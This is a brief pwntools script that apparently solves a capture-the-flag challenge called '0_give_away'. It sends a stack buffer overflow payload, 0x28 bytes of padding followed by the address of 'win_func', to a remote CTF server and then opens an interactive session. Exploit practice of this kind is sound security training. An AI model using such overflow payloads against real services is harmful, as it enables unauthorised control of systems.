from pwn import *
b=ELF("./0_give_away")
r=remote("sharkyctf.xyz",20333)

pay=""
pay+='x'*0x28
pay+=p64(b.symbols['win_func'])

r.sendline(pay)
r.interactive()
